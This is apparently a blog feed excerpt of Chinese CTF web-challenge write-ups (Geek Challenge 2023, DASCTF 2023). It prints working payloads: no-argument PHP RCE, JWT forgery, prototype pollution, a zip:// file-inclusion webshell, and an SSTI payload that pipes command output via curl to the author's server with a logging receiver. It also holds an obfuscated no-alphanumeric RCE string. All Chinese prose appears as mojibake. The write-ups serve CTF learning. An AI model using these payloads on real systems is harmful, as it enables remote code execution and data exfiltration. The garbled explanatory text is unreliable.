class="string">&#x27;var&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&quot;WAF!!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;PLZ DONT HCAK MEğŸ˜…&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ— å‚æ•°RCEï¼Œä½¿ç”¨æ— å‚æ•°å‡½æ•°åµŒå¥—è¯»å–æ–‡ä»¶</p><p><code>payload: ?var=highlight_file(array_rand(array_flip(scandir(pos(localeconv())))));</code></p><h2 id="é›¨"><a href="#é›¨" class="headerlink" title="é›¨"></a>é›¨</h2><p>é¡µé¢æ²¡å•¥ä¿¡æ¯ï¼Œæ‰«ä¸‹ç›®å½•ï¼š<br><img src="/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982023/rain.png" alt=""></p><p>ä¹Ÿæ²¡å•¥ä¿¡æ¯ï¼Œå°è¯•æŠ“åŒ…ï¼š</p><p><img src="/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982023/rain1.png" alt=""></p><p>å‘ç°jwtå½¢å¼çš„cookieå’Œhintï¼š<br><img src="/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982023/rain2.png" alt=""></p><p>æ ¹æ®é¢˜ç›®æè¿°å¯çŸ¥ï¼Œ<code>challenge maker</code>æ˜¯<code>VanZY</code>ï¼Œæ„é€ adminçš„jwtå½“å‚æ•°ä¼ è¿›å»ï¼ŒåŒæ—¶getè®¿é—®<code>/source</code>ï¼Œå¾—åˆ°æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">const express = require(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line">const jwt = require(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line">const app = express();</span><br><span class="line">const bodyParser = require(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line">const path = require(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line">const jwt_secret = <span class="string">&quot;VanZY&quot;</span>;</span><br><span class="line">const cookieParser = require(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line">const putil_merge = require(<span class="string">&quot;putil-merge&quot;</span>)</span><br><span class="line">app.<span class="built_in">set</span>(<span class="string">&#x27;views&#x27;</span>, <span class="string">&#x27;./views&#x27;</span>);</span><br><span class="line">app.<span class="built_in">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.use(cookieParser());</span><br><span class="line">app.use(bodyParser.urlencoded(&#123;extended: true&#125;)).use(bodyParser.json())</span><br><span class="line">var Super = &#123;&#125;;</span><br><span class="line">var safecode = function (code)&#123;</span><br><span class="line">    let validInput = /<span class="keyword">global</span>|mainModule|<span class="keyword">import</span>|constructor|read|write|_load|<span class="built_in">exec</span>|spawnSync|stdout|<span class="built_in">eval</span>|stdout|Function|setInterval|setTimeout|var|\+|\*/ig;</span><br><span class="line">    <span class="keyword">return</span> !validInput.test(code);</span><br><span class="line">&#125;;</span><br><span class="line">app.<span class="built_in">all</span>(<span class="string">&#x27;/code&#x27;</span>, (req, res) =&gt; &#123;</span><br><span class="line">  res.<span class="built_in">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (req.method == <span class="string">&quot;POST&quot;</span> &amp;&amp; req.body) &#123;</span><br><span class="line">    putil_merge(&#123;&#125;, req.body, &#123;deep:true&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  res.send(<span class="string">&quot;welcome to code&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="built_in">all</span>(<span class="string">&#x27;/hint&#x27;</span>, (req, res) =&gt; &#123;</span><br><span class="line">    res.<span class="built_in">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">    res.send(<span class="string">&quot;I heard that the challenge maker likes to use his own id as secret_key&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">app.get(<span class="string">&#x27;/source&#x27;</span>, (req, res) =&gt; &#123;</span><br><span class="line">  res.<span class="built_in">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  var auth = req.cookies.auth;</span><br><span class="line">  jwt.verify(auth, jwt_secret , function(err, decoded) &#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(decoded.user===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        res.sendFile(path.join(__dirname + <span class="string">&#x27;/index.js&#x27;</span>));</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.send(<span class="string">&#x27;you are not admin    &lt;!--Maybe you can view /hint--&gt;&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    catch&#123;</span><br><span class="line">      res.send(<span class="string">&quot;Fuck you Hacker!!!&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">app.<span class="built_in">all</span>(<span class="string">&#x27;/create&#x27;</span>, (req, res) =&gt; &#123;</span><br><span class="line">  res.<span class="built_in">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!req.body.name || req.body.name === undefined || req.body.name === null)&#123;</span><br><span class="line">    res.send(<span class="string">&quot;please input name&quot;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (Super[<span class="string">&#x27;userrole&#x27;</span>] === <span class="string">&#x27;Superadmin&#x27;</span>) &#123;</span><br><span class="line">        res.render(<span class="string">&#x27;index&#x27;</span>, req.body);</span><br><span class="line">      &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!safecode(req.body.name)) &#123;</span><br><span class="line">            res.send(<span class="string">&quot;ä½ åœ¨åšä»€ä¹ˆï¼Ÿå¿«åœä¸‹ï¼ï¼ï¼&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            res.render(<span class="string">&#x27;index&#x27;</span>, &#123;name: req.body.name&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>,(req, res) =&gt; &#123;</span><br><span class="line">    res.<span class="built_in">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">    var token = jwt.sign(&#123;<span class="string">&#x27;user&#x27;</span>:<span class="string">&#x27;guest&#x27;</span>&#125;,jwt_secret,&#123; algorithm: <span class="string">&#x27;HS256&#x27;</span> &#125;);</span><br><span class="line">    res.cookie(<span class="string">&#x27;auth &#x27;</span>,token);</span><br><span class="line">    res.end(<span class="string">&#x27;Only admin can get source in /source&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line">app.listen(<span class="number">3000</span>, () =&gt; console.log(<span class="string">&#x27;Server started on port 3000&#x27;</span>));</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æºç åå‘ç°ï¼Œè¿™æ˜¯ä¸€ä¸ªåŸºäºNodejsæœåŠ¡å™¨çš„ä¸€ä¸ªExpressçš„æ¡†æ¶ï¼Œæœ‰åŸå‹é“¾æ±¡æŸ“å­˜åœ¨</p><h2 id="famale-imp-l0ve"><a href="#famale-imp-l0ve" class="headerlink" title="famale_imp_l0ve"></a>famale_imp_l0ve</h2><p>æ‰“å¼€åå‘ç°å­˜åœ¨æ–‡ä»¶ä¸Šä¼ ï¼Œä½†æ˜¯åªèƒ½ä¸Šä¼ zipæ–‡ä»¶ï¼ŒæŸ¥çœ‹æºç å‘ç°ç”±<code>include.php</code>æ–‡ä»¶ï¼Œè®¿é—®åå‘ç°å¦‚ä¸‹ä»£ç ï¼š<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//o2takuXXå¸ˆå‚…è¯´æœ‰é—®é¢˜ï¼Œå¿˜çœ‹äº†ã€‚</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$file</span>, -<span class="number">4</span>)) == <span class="string">&quot;.jpg&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure></p><p>å­˜åœ¨ä»»æ„æ–‡ä»¶åŒ…å«ï¼Œä½†æ˜¯å¼ºåˆ¶åç¼€ä¸º<code>.jpg</code></p><p>ç”±äºåªèƒ½ä¸Šä¼ zipæ–‡ä»¶ï¼Œè¿˜è¦è¿›è¡Œæ–‡ä»¶åŒ…å«ï¼Œæˆ‘ä»¬ä½¿ç”¨zipä¼ªåè®®ç»•è¿‡ï¼Œä½¿ç”¨æ–¹æ³•å‚ç…§å¦‚ä¸‹é“¾æ¥ï¼š</p><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://lightless.me/archives/include-file-from-zip-or-phar.html">é€šè¿‡ zip/phar åè®®åŒ…å«æ–‡ä»¶ - lightless blog</a></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payloadï¼š</span><br><span class="line">å‡†å¤‡ä¸€ä¸ªtxtæ–‡ä»¶ï¼Œå†…å®¹ä¸º&lt;?php phpinfo();</span><br><span class="line">å°†å…¶åç¼€æ”¹ä¸º.jpg</span><br><span class="line">å‹ç¼©ä¸ºzipæ–‡ä»¶ï¼Œä¸Šä¼ åè®¿é—®include.php</span><br><span class="line">ä¼ å‚ï¼š?file=zip:///var/www/upload/shell.zip%231.jpg// %23æ˜¯#çš„urlç¼–ç </span><br><span class="line">å‘ç°å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œæœ€åæ„é€ payload: &lt;?php eval(system(&#x27;cat /flag&#x27;));</span><br><span class="line">æ‹¿åˆ°flag</span><br></pre></td></tr></table></figure><h2 id="ez-path"><a href="#ez-path" class="headerlink" title="ez_path"></a>ez_path</h2><p>æŸ¥çœ‹æºç ï¼Œæ‰¾åˆ°æç¤ºï¼š<br><img src="/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982023/path.png" alt=""></p><p>åœ¨<code>/upload</code>ç›®å½•ä¸‹åˆ›å»ºæ–‡ç« ç›®å½•åå­—ä¸º<code>/f14444</code>å†…å®¹ä¸€æ ·</p><p>æŸ¥çœ‹è¯¥æ–‡ç« ï¼Œæ‹¿åˆ°flag</p><h2 id="klf-ssti"><a href="#klf-ssti" class="headerlink" title="klf_ssti"></a>klf_ssti</h2><p>æŸ¥çœ‹æºç åå‘ç°æç¤º<code>/hack?</code>ï¼Œè®¿é—®ååœ¨æŸ¥çœ‹æºç ï¼Œå‘ç°ä¸€ä¸ª<code>klf</code>å‚æ•°ï¼Œå¤šæ¬¡å°è¯•åå‘ç°æ˜¯ä¸ªæ— å›æ˜¾SSTI</p><p>å¯ä»¥å°è¯•åˆ©ç”¨<code>ctf_curl</code>çš„çŸ¥è¯†ç‚¹ï¼Œä½¿ç”¨curlå°†æ•°æ®å¤–å¸¦åˆ°è‡ªå·±çš„æœåŠ¡å™¨ä¸Š</p><p>é¦–å…ˆåœ¨è‡ªå·±çš„vpsä¸Šå‡†å¤‡ä¸€ä¸ªå¯ä»¥æ¥å—postè¯·æ±‚çš„phpæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// æ£€æŸ¥æ˜¯å¦æœ‰äººè®¿é—®äº†è¿™ä¸ªæ–‡ä»¶</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$method</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>];</span><br><span class="line">    <span class="variable">$params</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®°å½•GETå‚æ•°</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$method</span> === <span class="string">&#x27;GET&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable">$params</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®°å½•POSTå‚æ•°</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$method</span> === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable">$params</span> = <span class="title function_ invoke__">http_build_query</span>(<span class="variable">$_POST</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ›å»ºä¸€ä¸ªè®°å½•æ–‡ä»¶å¹¶å†™å…¥è®¿é—®ä¿¡æ¯</span></span><br><span class="line">    <span class="variable">$logFile</span> = <span class="string">&#x27;request_log.txt&#x27;</span>;</span><br><span class="line">    <span class="variable">$logData</span> = <span class="string">&quot;Method: <span class="subst">$method</span>\nParameters: <span class="subst">$params</span>\n&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$logFile</span>, <span class="variable">$logData</span>, FILE_APPEND);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¾“å‡ºä¸€ä¸ªå“åº”</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Request logged successfully.&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// å¦‚æœæ²¡æœ‰æœ‰æ•ˆè¯·æ±‚æ–¹æ³•ï¼Œè¿”å›é”™è¯¯ä¿¡æ¯</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Invalid request.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>å°†å…¶ä¿å­˜ä¸º<code>ssti.php</code>æ–‡ä»¶</p><p>é€šè¿‡getä¼ å‚ï¼š<code>?klf=&#123;&#123;config.__class__.__init__.__globals__['os'].popen('curl -X POST -d "$(ls)" ip/ssti.php').read()&#125;&#125;</code></p><p>åœ¨vpsä¸Šä¼šç”Ÿæˆä¸€ä¸ª<code>request_log.txt</code>çš„æ–‡ä»¶ï¼Œå°†å…¶å†…å®¹è§£ç ï¼š<br><img src="/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982023/ssti.png" alt=""></p><p>å‘ç°å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œé€šè¿‡å¤šæ¬¡ä¿®æ”¹å‘½ä»¤æœ€ç»ˆæ‹¿åˆ°flagï¼š<br><code>?klf=&#123;&#123;config.__class__.__init__.__globals__['os'].popen('curl -X POST -d "$(cat /app/fl4gfl4gfl4g)" ip/ssti.php').read()&#125;&#125;</code></p><p><img src="/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982023/ssti1.png" alt=""></p><h2 id="EzRce"><a href="#EzRce" class="headerlink" title="EzRce"></a>EzRce</h2><p>æ— æ•°å­—å­—æ¯rceï¼Œç›´æ¥ç”¨æˆ–ç»•è¿‡</p><p>payloadï¼š<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?data=(<span class="string">&quot;%0d%0b%04%09%12&quot;</span>|<span class="string">&quot;%60%60%60%60%60&quot;</span>)(<span class="string">&#x27;a&#x27;</span>);(<span class="string">&quot;%03%08%04%09%12&quot;</span>|<span class="string">&quot;%60%60%60%60%60&quot;</span>)(<span class="string">&#x27;a&#x27;</span>);(<span class="string">&quot;%09%0e%09%00%13%05%14&quot;</span>|<span class="string">&quot;%60%60%60%5f%60%60%60&quot;</span>)((<span class="string">&quot;%0f%10%05%0e%00%02%01%13%05%04%09%12&quot;</span>|<span class="string">&quot;%60%60%60%60%5f%60%60%60%60%60%60%60&quot;</span>)</span><br><span class="line">,<span class="string">&#x27;..&#x27;</span>);(<span class="string">&quot;%03%08%04%09%12&quot;</span>|<span class="string">&quot;%60%60%60%60%60&quot;</span>)(<span class="string">&#x27;..&#x27;</span>);(<span class="string">&quot;%03%08%04%09%12&quot;</span>|<span class="string">&quot;%60%60%60%60%60&quot;</span>)(<span class="string">&#x27;..&#x27;</span>);(<span class="string">&quot;%03%08%04%09%12&quot;</span>|<span class="string">&quot;%60%60%60%60%60&quot;</span>)(<span class="string">&#x27;..&#x27;</span>);(<span class="string">&quot;%03%08%04%09%12&quot;</span>|<span class="string">&quot;%60%60%60%60%60&quot;</span>)(<span class="string">&#x27;..&#x27;</span>);(<span class="string">&quot;%03%08%04%09%12&quot;</span>|<span class="string">&quot;%60%60%60%60%60&quot;</span>)(<span class="string">&#x27;..&#x27;</span>);(<span class="string">&quot;%09%0e%09%00%13%05%14&quot;</span>|<span class="string">&quot;%60%60%60%5f%60%60%60&quot;</span>)((<span class="string">&quot;%0f%10%05%0e%00%02%01%13%05%04%09%12&quot;</span>|<span class="string">&quot;%60%60%60%60%5f%60%60%60%60%60%60%60&quot;</span>),<span class="string">&#x27;/&#x27;</span>);(<span class="string">&quot;%10%12%09%0e%14%00%12&quot;</span>|<span class="string">&quot;%60%60%60%60%60%5f%60&quot;</span>)(((<span class="string">&quot;%01%12%12%01%19%00%12%01%0e%04&quot;</span>|<span class="string">&quot;%60%60%60%60%60%5f%60%60%60%60&quot;</span>)((<span class="string">&quot;%01%12%12%01%19%00%06%0c%09%10&quot;</span>|<span class="string">&quot;%60%60%60%60%60%5f%60%60%60%60&quot;</span>)((<span class="string">&quot;%13%03%01%0e%04%09%12&quot;</span>|<span class="string">&quot;%60%60%60%60%60%60%60&quot;</span>)(<span class="string">&#x27;.&#x27;</span>)))));</span><br><span class="line"><span class="comment">//è¯»å–æ–‡ä»¶å</span></span><br><span class="line"></span><br><span class="line">?data=(<span class="string">&quot;%0d%0b%04%09%12&quot;</span>|<span class="string">&quot;%60%60%60%60%60&quot;</span>)(<span class="string">&#x27;a&#x27;</span>);(<span class="string">&quot;%03%08%04%09%12&quot;</span>|<span class="string">&quot;%60%60%60%60%60&quot;</span>)(<span class="string">&#x27;a&#x27;</span>);(<span class="string">&quot;%09%0e%09%00%13%05%14&quot;</span>|<span class="string">&quot;%60%60%60%5f%60%60%60&quot;</span>)((<span class="string">&quot;%0f%10%05%0e%00%02%01%13%05%04%09%12&quot;</span>|<span class="string">&quot;%60%60%60%60%5f%60%60%60%60%60%60%60&quot;</span>)</span><br><span class="line">,<span class="string">&#x27;..&#x27;</span>);(<span class="string">&quot;%03%08%04%09%12&quot;</span>|<span class="string">&quot;%60%60%60%60%60&quot;</span>)(<span class="string">&#x27;..&#x27;</span>);(<span class="string">&quot;%03%08%04%09%12&quot;</span>|<span class="string">&quot;%60%60%60%60%60&quot;</span>)(<span class="string">&#x27;..&#x27;</span>);(<span class="string">&quot;%03%08%04%09%12&quot;</span>|<span class="string">&quot;%60%60%60%60%60&quot;</span>)(<span class="string">&#x27;..&#x27;</span>);(<span class="string">&quot;%03%08%04%09%12&quot;</span>|<span class="string">&quot;%60%60%60%60%60&quot;</span>)(<span class="string">&#x27;..&#x27;</span>);(<span class="string">&quot;%03%08%04%09%12&quot;</span>|<span class="string">&quot;%60%60%60%60%60&quot;</span>)(<span class="string">&#x27;..&#x27;</span>);(<span class="string">&quot;%09%0e%09%00%13%05%14&quot;</span>|<span class="string">&quot;%60%60%60%5f%60%60%60&quot;</span>)((<span class="string">&quot;%0f%10%05%0e%00%02%01%13%05%04%09%12&quot;</span>|<span class="string">&quot;%60%60%60%60%5f%60%60%60%60%60%60%60&quot;</span>),<span class="string">&#x27;/&#x27;</span>);(<span class="string">&quot;%10%12%09%0e%14%00%12&quot;</span>|<span class="string">&quot;%60%60%60%60%60%5f%60&quot;</span>)((<span class="string">&quot;%09%0e%03%0c%15%04%05&quot;</span>|<span class="string">&quot;%60%60%60%60%60%60%60&quot;</span>)((<span class="string">&quot;%01%12%12%01%19%00%12%01%0e%04&quot;</span>|<span class="string">&quot;%60%60%60%60%60%5f%60%60%60%60&quot;</span>)((<span class="string">&quot;%01%12%12%01%19%00%06%0c%09%10&quot;</span>|<span class="string">&quot;%60%60%60%60%60%5f%60%60%60%60&quot;</span>)((<span class="string">&quot;%13%03%01%0e%04%09%12&quot;</span>|<span class="string">&quot;%60%60%60%60%60%60%60&quot;</span>)(<span class="string">&#x27;.&#x27;</span>)))));</span><br></pre></td></tr></table></figure></p><h1 id="Reserve"><a href="#Reserve" class="headerlink" title="Reserve"></a>Reserve</h1><h2 id="å¹¸è¿æ•°å­—"><a href="#å¹¸è¿æ•°å­—" class="headerlink" title="å¹¸è¿æ•°å­—"></a>å¹¸è¿æ•°å­—</h2><p>å†™è„šæœ¬è·‘</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exe_path = <span class="string">&#x27;1.exe&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> number <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">999</span>):</span><br><span class="line">    result = subprocess.run([exe_path], <span class="built_in">input</span>=<span class="built_in">str</span>(number), capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    output = result.stdout</span><br><span class="line">    <span class="keyword">if</span> output.count(<span class="string">&quot;SYC&quot;</span>)==<span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(output)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æå®¢å¤§æŒ‘æˆ˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF X 0psu3åä¸€æœˆæŒ‘æˆ˜èµ› 2023</title>
      <link href="/2023/11/28/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-2023/"/>
      <url>/2023/11/28/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-2023/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="realrce"><a href="#realrce" class="headerlink" title="realrce"></a>realrce</h2><p>é™„ä»¶ä¸­æœ‰æºç ï¼š<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">waf</span>(<span class="params">input_code</span>) &#123;</span><br><span class="line">    bypasspin = <span class="regexp">/%[0-9a-fA-F]&#123;2&#125;/i</span>;</span><br><span class="line">    <span class="keyword">const</span> bypasscode = bypasspin.<span class="title function_">test</span>(input_code);</span><br><span class="line">    <span class="keyword">if</span> (bypasscode) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">waf</span>(<span class="built_in">decodeURIComponent</span>(input_code));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Error decoding input: &quot;</span>, error);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> blacklist = [<span class="regexp">/__proto__/i</span>, <span class="regexp">/constructor/i</span>, <span class="regexp">/prototype/i</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> blackword <span class="keyword">of</span> blacklist) &#123;</span><br><span class="line">        <span class="keyword">if</span> (blackword.<span class="title function_">test</span>(input_code)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>åˆ©ç”¨æŠ¥é”™æ¥ç»•è¿‡wafè¿›è¡ŒåŸå‹é“¾æ±¡æŸ“</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">LockCylinder</span>(<span class="params">input, blackchr = [<span class="string">&quot;&amp;&amp;&quot;</span>, <span class="string">&quot;||&quot;</span>, <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;|&quot;</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;+&quot;</span>, <span 